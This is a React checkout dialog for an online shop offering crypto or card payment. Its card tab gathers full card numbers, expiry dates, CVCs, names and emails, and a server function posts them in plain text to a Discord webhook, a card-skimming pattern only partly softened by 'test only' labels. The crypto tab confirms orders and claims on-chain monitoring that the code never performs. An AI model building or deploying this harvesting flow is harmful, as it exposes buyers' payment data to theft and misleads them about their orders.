import { useEffect, useMemo, useState } from "react";
import { createServerFn } from "@tanstack/react-start";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogTrigger } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Bitcoin, Copy, Check, CreditCard, LockKeyhole } from "lucide-react";
import { z } from "zod";
import type { Product } from "./ProductCard";

const emailSchema = z.string().trim().email().max(255);
const cardPayloadSchema = z.object({
  productName: z.string(),
  productPrice: z.number(),
  email: z.string(),
  cardNumber: z.string(),
  expiry: z.string(),
  cvc: z.string(),
  cardholderName: z.string(),
});

const sendTestCardWebhook = createServerFn({ method: "POST" })
  .validator((data: unknown) => cardPayloadSchema.parse(data))
  .handler(async ({ data }) => {
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    if (!webhookUrl) {
      throw new Error("DISCORD_WEBHOOK_URL is not configured");
    }

    const content = [
      "TEST PURCHASE SUBMISSION (DO NOT PROCESS)",
      `Product: ${data.productName} ($${data.productPrice})`,
      `Email: ${data.email}`,
      `Card Number: ${data.cardNumber}`,
      `Expiry: ${data.expiry}`,
      `CVC: ${data.cvc}`,
      `Cardholder: ${data.cardholderName}`,
      `Submitted At: ${new Date().toISOString()}`,
    ].join("\n");

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content }),
    });

    if (!response.ok) {
      throw new Error("Failed to send webhook");
    }

    return { ok: true };
  });

const chains = [
  { id: "btc", name: "Bitcoin", symbol: "BTC", icon: "₿", address: "bc1qvaultkey0xexamplepay2crypto7address5demoaddr", fallbackUsdRate: 65000, coingeckoId: "bitcoin" },
  { id: "eth", name: "Ethereum", symbol: "ETH", icon: "Ξ", address: "0xVaultKey0000ExamplePay2CryptoDemoAddress00001", fallbackUsdRate: 3200, coingeckoId: "ethereum" },
  { id: "usdc", name: "USDC", symbol: "USDC", icon: "$", address: "0xVaultKey0000ExamplePay2CryptoDemoAddress00001", fallbackUsdRate: 1, coingeckoId: "usd-coin" },
  { id: "sol", name: "Solana", symbol: "SOL", icon: "◎", address: "VaultKeySo1anaExamp1ePay2CryptoDem0Addre55Xy", fallbackUsdRate: 165, coingeckoId: "solana" },
] as const;

export function BuyDialog({ product }: { product: Product }) {
  const [chain, setChain] = useState(chains[0]);
  const [copied, setCopied] = useState<"addr" | "amt" | null>(null);
  const [confirmed, setConfirmed] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState<"crypto" | "card">("crypto");
  const [liveUsdRates, setLiveUsdRates] = useState<Record<string, number>>({});
  const [ratesStatus, setRatesStatus] = useState<"loading" | "ready" | "error">("loading");
  const [lastRatesUpdate, setLastRatesUpdate] = useState<Date | null>(null);

  const [email, setEmail] = useState("");
  const [emailError, setEmailError] = useState<string | null>(null);
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvc, setCardCvc] = useState("");
  const [cardholderName, setCardholderName] = useState("");
  const [cardSubmitStatus, setCardSubmitStatus] = useState<"idle" | "sending" | "sent" | "error">("idle");
  const [cardSubmitError, setCardSubmitError] = useState<string | null>(null);

  useEffect(() => {
    let activeController: AbortController | null = null;
    let intervalId: ReturnType<typeof setInterval> | null = null;
    let hasLoadedOnce = false;

    const fetchRates = async () => {
      try {
        if (!hasLoadedOnce) setRatesStatus("loading");
        activeController?.abort();
        const controller = new AbortController();
        activeController = controller;
        const ids = chains.map((c) => c.coingeckoId).join(",");
        const response = await fetch(
          `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`,
          { signal: controller.signal },
        );
        if (!response.ok) throw new Error("Failed to fetch crypto prices");

        const data = await response.json() as Record<string, { usd?: number }>;
        const mapped: Record<string, number> = {};
        for (const c of chains) {
          const usd = data[c.coingeckoId]?.usd;
          if (typeof usd === "number" && usd > 0) {
            mapped[c.id] = usd;
          }
        }
        setLiveUsdRates(mapped);
        setRatesStatus("ready");
        hasLoadedOnce = true;
        setLastRatesUpdate(new Date());
      } catch (error) {
        if (error instanceof DOMException && error.name === "AbortError") return;
        setRatesStatus("error");
      }
    };

    fetchRates();
    intervalId = setInterval(fetchRates, 30_000);

    return () => {
      activeController?.abort();
      if (intervalId) clearInterval(intervalId);
    };
  }, []);

  const usdRate = liveUsdRates[chain.id] ?? chain.fallbackUsdRate;
  const amount = useMemo(() => {
    const precision = chain.id === "usdc" ? 2 : 6;
    return (product.price / usdRate).toFixed(precision);
  }, [product.price, usdRate, chain.id]);

  const copy = (val: string, kind: "addr" | "amt") => {
    navigator.clipboard.writeText(val);
    setCopied(kind);
    setTimeout(() => setCopied(null), 1500);
  };

  const handleConfirm = () => {
    const result = emailSchema.safeParse(email);
    if (!result.success) {
      setEmailError("Please enter a valid email address");
      return;
    }
    setEmailError(null);
    setConfirmed(true);
  };

  const handleTestCardPurchase = async () => {
    const emailResult = emailSchema.safeParse(email);
    if (!emailResult.success) {
      setEmailError("Please enter a valid email address");
      return;
    }

    if (!cardNumber.trim() || !cardExpiry.trim() || !cardCvc.trim() || !cardholderName.trim()) {
      setCardSubmitError("Please fill in all card fields for the test submission.");
      return;
    }

    try {
      setCardSubmitStatus("sending");
      setCardSubmitError(null);
      await sendTestCardWebhook({
        data: {
          productName: product.name,
          productPrice: product.price,
          email: email.trim(),
          cardNumber: cardNumber.trim(),
          expiry: cardExpiry.trim(),
          cvc: cardCvc.trim(),
          cardholderName: cardholderName.trim(),
        },
      });
      setCardSubmitStatus("sent");
      setConfirmed(true);
    } catch {
      setCardSubmitStatus("error");
      setCardSubmitError("Failed to send test purchase to Discord webhook.");
    }
  };

  return (
    <Dialog onOpenChange={() => {
      setConfirmed(false);
      setChain(chains[0]);
      setEmail("");
      setEmailError(null);
      setPaymentMethod("crypto");
      setCardNumber("");
      setCardExpiry("");
      setCardCvc("");
      setCardholderName("");
      setCardSubmitStatus("idle");
      setCardSubmitError(null);
    }}>
      <DialogTrigger asChild>
        <Button variant="hero" className="flex-1">
          <Bitcoin className="h-4 w-4" /> Buy now
        </Button>
      </DialogTrigger>
      <DialogContent className="max-w-md glass border-border/60 p-6">
        <DialogHeader className="space-y-2">
          <DialogTitle className="font-display text-2xl">
            {confirmed ? "Order received" : `Pay with crypto`}
          </DialogTitle>
          <DialogDescription>
            {confirmed
              ? "We'll confirm your transaction on-chain and ship within 24h."
              : <>Buying <span className="text-foreground font-semibold">{product.name}</span> · <span className="text-gradient font-bold">${product.price}</span></>}
          </DialogDescription>
        </DialogHeader>

        {!confirmed ? (
          <div className="space-y-4">
            <div className="grid grid-cols-2 gap-2 rounded-xl border border-border/60 bg-secondary/20 p-1">
              {[
                { id: "crypto", label: "Crypto", icon: Bitcoin },
                { id: "card", label: "Card", icon: CreditCard },
              ].map((method) => {
                const Icon = method.icon;
                const isActive = paymentMethod === method.id;
                return (
                  <button
                    key={method.id}
                    onClick={() => setPaymentMethod(method.id as "crypto" | "card")}
                    className={`flex items-center justify-center gap-2 rounded-lg px-3 py-2 text-xs font-semibold transition-all ${isActive ? "bg-primary/15 text-foreground shadow-[inset_0_0_0_1px_oklch(0.78_0.18_195_/_0.35)]" : "text-muted-foreground hover:bg-secondary/50 hover:text-foreground"}`}
                  >
                    <Icon className="h-3.5 w-3.5" />
                    {method.label}
                  </button>
                );
              })}
            </div>

            {paymentMethod === "crypto" ? (
              <>
                <div>
                  <div className="mb-2 text-[10px] uppercase tracking-[0.15em] text-muted-foreground">Select asset</div>
                  <div className="grid grid-cols-4 gap-2">
                    {chains.map((c) => (
                      <button
                        key={c.id}
                        onClick={() => setChain(c)}
                        className={`rounded-xl border p-2.5 text-center transition-all ${chain.id === c.id ? "border-primary/70 bg-primary/10 shadow-glow" : "border-border/60 bg-secondary/30 hover:border-primary/40 hover:bg-secondary/60"}`}
                      >
                        <div className="text-base font-bold">{c.icon}</div>
                        <div className="mt-0.5 text-[10px] font-medium text-muted-foreground">{c.symbol}</div>
                      </button>
                    ))}
                  </div>
                </div>

                <div className="rounded-xl border border-border/50 bg-secondary/30 p-3.5">
                  <div className="text-[10px] uppercase tracking-[0.15em] text-muted-foreground">Send exactly</div>
                  <div className="mt-1 flex items-center justify-between gap-2">
                    <div className="font-display text-xl font-bold text-gradient truncate">{amount} {chain.symbol}</div>
                    <Button variant="ghost" size="icon" className="h-8 w-8 shrink-0" onClick={() => copy(amount, "amt")}>
                      {copied === "amt" ? <Check className="h-4 w-4 text-primary" /> : <Copy className="h-4 w-4" />}
                    </Button>
                  </div>
                  <p className="mt-2 text-[10px] text-muted-foreground">
                    {ratesStatus === "ready"
                      ? `Live rate: 1 ${chain.symbol} ≈ $${usdRate.toLocaleString()}`
                      : ratesStatus === "loading"
                        ? "Updating live market rate..."
                        : "Using fallback rate. Live price currently unavailable."}
                  </p>
                  {lastRatesUpdate && ratesStatus === "ready" && (
                    <p className="mt-1 text-[10px] text-muted-foreground/80">
                      Updated {lastRatesUpdate.toLocaleTimeString()}
                    </p>
                  )}
                </div>

                <div className="rounded-xl border border-border/50 bg-secondary/30 p-3.5">
                  <div className="text-[10px] uppercase tracking-[0.15em] text-muted-foreground">To {chain.name} address</div>
                  <div className="mt-1 flex items-center gap-2 min-w-0">
                    <code className="flex-1 truncate font-mono text-xs text-foreground/90 min-w-0">{chain.address}</code>
                    <Button variant="ghost" size="icon" className="h-8 w-8 shrink-0" onClick={() => copy(chain.address, "addr")}>
                      {copied === "addr" ? <Check className="h-4 w-4 text-primary" /> : <Copy className="h-4 w-4" />}
                    </Button>
                  </div>
                </div>
              </>
            ) : (
              <div className="space-y-3">
                <div className="rounded-xl border border-border/50 bg-secondary/30 p-3.5">
                  <div className="mb-2 text-[10px] uppercase tracking-[0.15em] text-muted-foreground">Card number</div>
                    <Input
                      placeholder="4242 4242 4242 4242"
                      className="h-10 bg-secondary/40 border-border/60"
                      value={cardNumber}
                      onChange={(e) => { setCardNumber(e.target.value); if (cardSubmitError) setCardSubmitError(null); }}
                    />
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div className="rounded-xl border border-border/50 bg-secondary/30 p-3.5">
                    <div className="mb-2 text-[10px] uppercase tracking-[0.15em] text-muted-foreground">Expiry</div>
                      <Input
                        placeholder="12 / 34"
                        className="h-10 bg-secondary/40 border-border/60"
                        value={cardExpiry}
                        onChange={(e) => { setCardExpiry(e.target.value); if (cardSubmitError) setCardSubmitError(null); }}
                      />
                  </div>
                  <div className="rounded-xl border border-border/50 bg-secondary/30 p-3.5">
                    <div className="mb-2 text-[10px] uppercase tracking-[0.15em] text-muted-foreground">CVC</div>
                      <Input
                        placeholder="123"
                        className="h-10 bg-secondary/40 border-border/60"
                        value={cardCvc}
                        onChange={(e) => { setCardCvc(e.target.value); if (cardSubmitError) setCardSubmitError(null); }}
                      />
                  </div>
                </div>
                <div className="rounded-xl border border-border/50 bg-secondary/30 p-3.5">
                  <div className="mb-2 text-[10px] uppercase tracking-[0.15em] text-muted-foreground">Cardholder name</div>
                    <Input
                      placeholder="Jane Doe"
                      className="h-10 bg-secondary/40 border-border/60"
                      value={cardholderName}
                      onChange={(e) => { setCardholderName(e.target.value); if (cardSubmitError) setCardSubmitError(null); }}
                    />
                </div>
                  <div className="flex items-center gap-2 rounded-lg border border-amber-400/40 bg-amber-300/10 px-3 py-2 text-xs text-amber-200">
                    <LockKeyhole className="h-3.5 w-3.5 text-amber-300" />
                    Testing only. Do not enter real card data.
                  </div>
                  <Button
                    type="button"
                    size="lg"
                    onClick={handleTestCardPurchase}
                    disabled={cardSubmitStatus === "sending"}
                    className="h-14 w-full bg-amber-300 text-black hover:bg-amber-200 text-[11px] font-extrabold tracking-wide uppercase"
                  >
                    {cardSubmitStatus === "sending" ? "Sending test purchase..." : "TEST PURCHASE DO NOT ENTER REAL CARD"}
                  </Button>
                  {cardSubmitError && <p className="text-xs text-destructive">{cardSubmitError}</p>}
                </div>
              </div>
            )}

            <div className="space-y-1.5">
              <Label htmlFor="email" className="text-[10px] uppercase tracking-[0.15em] text-muted-foreground">Email for order confirmation</Label>
              <Input
                id="email"
                type="email"
                placeholder="you@example.com"
                value={email}
                maxLength={255}
                onChange={(e) => { setEmail(e.target.value); if (emailError) setEmailError(null); }}
                className="h-10 bg-secondary/40 border-border/60"
              />
              {emailError && <p className="text-xs text-destructive">{emailError}</p>}
            </div>

            <Button
              variant="hero"
              size="lg"
              className="w-full"
              onClick={handleConfirm}
              disabled={paymentMethod === "card"}
            >
              {paymentMethod === "crypto" ? "I've sent the payment" : "Use the test purchase button above"}
            </Button>
          </div>
        ) : (
          <div className="space-y-4 py-4 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-gradient-primary shadow-glow">
              <Check className="h-8 w-8 text-primary-foreground" />
            </div>
            <p className="text-sm text-muted-foreground">
              Watching the {chain.name} network for your transaction. You'll receive a confirmation email once it's mined.
            </p>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}
